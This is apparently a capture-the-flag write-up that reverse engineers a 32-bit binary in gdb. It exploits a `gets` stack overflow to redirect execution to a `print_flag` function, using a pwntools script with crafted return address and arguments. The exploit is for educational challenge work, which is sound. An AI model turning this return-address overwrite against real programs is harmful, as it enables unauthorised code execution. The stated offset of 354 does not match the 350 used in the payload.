`*CHALL TEXT*`

## Reverse engineering

For this challenge, we are given only a binary, with no source code. The challenge text gives us direct instructions for the arguments to call `print_flag`. Downloading the file to our local machine, we can begin to reverse it.

Jumping to the main function, we see a welcome message and a call to the `fun_or_profit` function. Let's disassemble the function:

```
gdb-peda$ disas fun_or_profit
Dump of assembler code for function fun_or_profit:
   0x080498ca <+0>:     push   ebp
   0x080498cb <+1>:     mov    ebp,esp
   0x080498cd <+3>:     push   ebx
   0x080498ce <+4>:     sub    esp,0x158
   0x080498d4 <+10>:    call   0x80496a0 <__x86.get_pc_thunk.bx>
   0x080498d9 <+15>:    add    ebx,0xbd71b
   0x080498df <+21>:    mov    eax,0x8107430
   0x080498e5 <+27>:    mov    eax,DWORD PTR [eax]
   0x080498e7 <+29>:    push   eax
   0x080498e8 <+30>:    push   0x47
   0x080498ea <+32>:    push   0x1
   0x080498ec <+34>:    lea    eax,[ebx-0x36f40]
   0x080498f2 <+40>:    push   eax
   0x080498f3 <+41>:    call   0x805e420 <fwrite>
   0x080498f8 <+46>:    add    esp,0x10
   0x080498fb <+49>:    lea    eax,[ebp-0x15a]
   0x08049901 <+55>:    push   eax
   0x08049902 <+56>:    call   0x805e590 <gets>
   0x08049907 <+61>:    add    esp,0x4
   0x0804990a <+64>:    lea    eax,[ebx-0x36ef8]
   0x08049910 <+70>:    push   eax
   0x08049911 <+71>:    lea    eax,[ebp-0x15a]
   0x08049917 <+77>:    push   eax
   0x08049918 <+78>:    call   0x8049058
   0x0804991d <+83>:    add    esp,0x8
   0x08049920 <+86>:    test   eax,eax
   0x08049922 <+88>:    jne    0x8049935 <fun_or_profit+107>
   0x08049924 <+90>:    lea    eax,[ebx-0x36ef4]
   0x0804992a <+96>:    push   eax
   0x0804992b <+97>:    call   0x805e830 <puts>
   0x08049930 <+102>:   add    esp,0x4
   0x08049933 <+105>:   jmp    0x804999b <fun_or_profit+209>
   0x08049935 <+107>:   lea    eax,[ebx-0x36ec1]
   0x0804993b <+113>:   push   eax
   0x0804993c <+114>:   lea    eax,[ebp-0x15a]
   0x08049942 <+120>:   push   eax
   0x08049943 <+121>:   call   0x8049058
   0x08049948 <+126>:   add    esp,0x8
   0x0804994b <+129>:   test   eax,eax
   0x0804994d <+131>:   jne    0x8049960 <fun_or_profit+150>
   0x0804994f <+133>:   lea    eax,[ebx-0x36eb8]
   0x08049955 <+139>:   push   eax
   0x08049956 <+140>:   call   0x805e830 <puts>
   0x0804995b <+145>:   add    esp,0x4
   0x0804995e <+148>:   jmp    0x804999b <fun_or_profit+209>
   0x08049960 <+150>:   lea    eax,[ebx-0x36e84]
   0x08049966 <+156>:   push   eax
   0x08049967 <+157>:   lea    eax,[ebp-0x15a]
   0x0804996d <+163>:   push   eax
   0x0804996e <+164>:   call   0x8049058
   0x08049973 <+169>:   add    esp,0x8
   0x08049976 <+172>:   test   eax,eax
   0x08049978 <+174>:   jne    0x804998b <fun_or_profit+193>
   0x0804997a <+176>:   lea    eax,[ebx-0x36e7c]
   0x08049980 <+182>:   push   eax
   0x08049981 <+183>:   call   0x805e830 <puts>
   0x08049986 <+188>:   add    esp,0x4
   0x08049989 <+191>:   jmp    0x804999b <fun_or_profit+209>
   0x0804998b <+193>:   lea    eax,[ebx-0x36e56]
   0x08049991 <+199>:   push   eax
   0x08049992 <+200>:   call   0x805e830 <puts>
   0x08049997 <+205>:   add    esp,0x4
   0x0804999a <+208>:   nop
   0x0804999b <+209>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x0804999e <+212>:   leave  
   0x0804999f <+213>:   ret    
End of assembler dump.
```

Assuming we have an overflow on the initial `gets` call, we should be able to control the return, leading us to the `print_flag` function. Lets do a test:

```
gdb-peda$ pattern create 400 test.txt
Writing pattern of 400 chars to filename "test.txt"
gdb-peda$ r < test.txt
Starting program: /home/kali/Desktop/binary < test.txt
Greetings, traveller. Welcome to my SSH server.

Now, tell me: are you looking for fun or are you looking for profit?
> 
I don't know what that is.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x1c 
EBX: 0x5225416d ('mA%R')
ECX: 0x8108a70 --> 0x0 
EDX: 0x1 
ESI: 0x8106ff4 --> 0x0 
EDI: 0x1 
EBP: 0x416f2541 ('A%oA')
ESP: 0xffffd0a4 ("pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")
EIP: 0x25415325 ('%SA%')
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x25415325
[------------------------------------stack-------------------------------------]
0000| 0xffffd0a4 ("pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")
0004| 0xffffd0a8 ("A%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")
0008| 0xffffd0ac ("%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")
0012| 0xffffd0b0 ("rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")
0016| 0xffffd0b4 ("A%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")
0020| 0xffffd0b8 ("%WA%uA%XA%vA%YA%wA%ZA%xA%y")
0024| 0xffffd0bc ("uA%XA%vA%YA%wA%ZA%xA%y")
0028| 0xffffd0c0 ("A%vA%YA%wA%ZA%xA%y")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x25415325 in ?? ()
```

Indeed, we can control the return register. We get an offset of 354. 

---
## Calling conventions

To pass the correct arguments to the function, let's first disassemble the `print_flag` function:

```
gdb-peda$ disas print_flag
Dump of assembler code for function print_flag:
   0x080497c5 <+0>:     push   ebp
   0x080497c6 <+1>:     mov    ebp,esp
   0x080497c8 <+3>:     push   ebx
   0x080497c9 <+4>:     sub    esp,0x70
   0x080497cc <+7>:     call   0x80496a0 <__x86.get_pc_thunk.bx>
   0x080497d1 <+12>:    add    ebx,0xbd823
   0x080497d7 <+18>:    mov    edx,DWORD PTR [ebp+0xc]
   0x080497da <+21>:    mov    eax,DWORD PTR [ebp+0x10]
   0x080497dd <+24>:    mov    BYTE PTR [ebp-0x70],dl
   0x080497e0 <+27>:    mov    BYTE PTR [ebp-0x74],al
   0x080497e3 <+30>:    lea    eax,[ebx-0x36fec]
   0x080497e9 <+36>:    push   eax
   0x080497ea <+37>:    lea    eax,[ebx-0x36fea]
   0x080497f0 <+43>:    push   eax
   0x080497f1 <+44>:    call   0x805e400 <fopen>
   0x080497f6 <+49>:    add    esp,0x8
   0x080497f9 <+52>:    mov    DWORD PTR [ebp-0x8],eax
   0x080497fc <+55>:    cmp    DWORD PTR [ebp+0x8],0x15b
   0x08049803 <+62>:    je     0x8049829 <print_flag+100>
   0x08049805 <+64>:    push   DWORD PTR [ebp+0x8]
   0x08049808 <+67>:    lea    eax,[ebx-0x36fd8]
   0x0804980e <+73>:    push   eax
   0x0804980f <+74>:    call   0x8051b40 <printf>
   0x08049814 <+79>:    add    esp,0x8
   0x08049817 <+82>:    push   DWORD PTR [ebp-0x8]
   0x0804981a <+85>:    call   0x805df80 <fclose>
   0x0804981f <+90>:    add    esp,0x4
   0x08049822 <+93>:    push   0x1
   0x08049824 <+95>:    call   0x80510a0 <exit>
   0x08049829 <+100>:   movzx  eax,BYTE PTR [ebp-0x70]
   0x0804982d <+104>:   xor    eax,0x1
   0x08049830 <+107>:   test   al,al
   0x08049832 <+109>:   je     0x804986a <print_flag+165>
   0x08049834 <+111>:   cmp    BYTE PTR [ebp-0x70],0x0
   0x08049838 <+115>:   je     0x8049842 <print_flag+125>
   0x0804983a <+117>:   lea    eax,[ebx-0x36fac]
   0x08049840 <+123>:   jmp    0x8049848 <print_flag+131>
   0x08049842 <+125>:   lea    eax,[ebx-0x36fa7]
   0x08049848 <+131>:   push   eax
   0x08049849 <+132>:   lea    eax,[ebx-0x36fa0]
   0x0804984f <+138>:   push   eax
   0x08049850 <+139>:   call   0x8051b40 <printf>
   0x08049855 <+144>:   add    esp,0x8
   0x08049858 <+147>:   push   DWORD PTR [ebp-0x8]
   0x0804985b <+150>:   call   0x805df80 <fclose>
   0x08049860 <+155>:   add    esp,0x4
   0x08049863 <+158>:   push   0x1
   0x08049865 <+160>:   call   0x80510a0 <exit>
   0x0804986a <+165>:   cmp    BYTE PTR [ebp-0x74],0x57
   0x0804986e <+169>:   je     0x8049896 <print_flag+209>
   0x08049870 <+171>:   movsx  eax,BYTE PTR [ebp-0x74]
   0x08049874 <+175>:   push   eax
   0x08049875 <+176>:   lea    eax,[ebx-0x36f70]
   0x0804987b <+182>:   push   eax
   0x0804987c <+183>:   call   0x8051b40 <printf>
   0x08049881 <+188>:   add    esp,0x8
   0x08049884 <+191>:   push   DWORD PTR [ebp-0x8]
   0x08049887 <+194>:   call   0x805df80 <fclose>
   0x0804988c <+199>:   add    esp,0x4
   0x0804988f <+202>:   push   0x1
   0x08049891 <+204>:   call   0x80510a0 <exit>
   0x08049896 <+209>:   lea    eax,[ebp-0x6c]
   0x08049899 <+212>:   push   eax
   0x0804989a <+213>:   lea    eax,[ebx-0x36f43]
   0x080498a0 <+219>:   push   eax
   0x080498a1 <+220>:   push   DWORD PTR [ebp-0x8]
   0x080498a4 <+223>:   call   0x8051b90 <__isoc99_fscanf>
   0x080498a9 <+228>:   add    esp,0xc
   0x080498ac <+231>:   lea    eax,[ebp-0x6c]
   0x080498af <+234>:   push   eax
   0x080498b0 <+235>:   call   0x805e830 <puts>
   0x080498b5 <+240>:   add    esp,0x4
   0x080498b8 <+243>:   push   DWORD PTR [ebp-0x8]
   0x080498bb <+246>:   call   0x805df80 <fclose>
   0x080498c0 <+251>:   add    esp,0x4
   0x080498c3 <+254>:   push   0x0
   0x080498c5 <+256>:   call   0x80510a0 <exit>
End of assembler dump.
```

As we can see, the flag is loaded *before* the arguments are checked, so just jumping to the print won't work. Further, the arguments seem to be loaded from the stack, one after another. This makes the final exploit very simple, as we must simply place the arguments consecutively, and we're good to go. With a bit of experimentation, we can see that the arguments must be offset with 4 bytes from the return address. I'll be making the solution in python.

---
## Solution

```python
from pwn import *

context.binary = "./binary"
conn = process("./binary")

payload = b"A" * 350 # Offset for return pointer
payload += p32(0x080497c5) # Address for print_flag function
payload += b"A" * 4 # Filler before arguments
payload += p32(347) # arg1
payload += p32(1) # arg2
payload += p32(87) # arg3

conn.recv(4096)
conn.sendline(payload)
print(conn.recvuntil(b"}"))
```

This works locally. As the server doesn't have python installed, we can just write the payload to a file, and upload it:

```python
with open("fun_or_profit.txt", "w+b") as f:
	f.write(payload)
```

This gives us our flag.


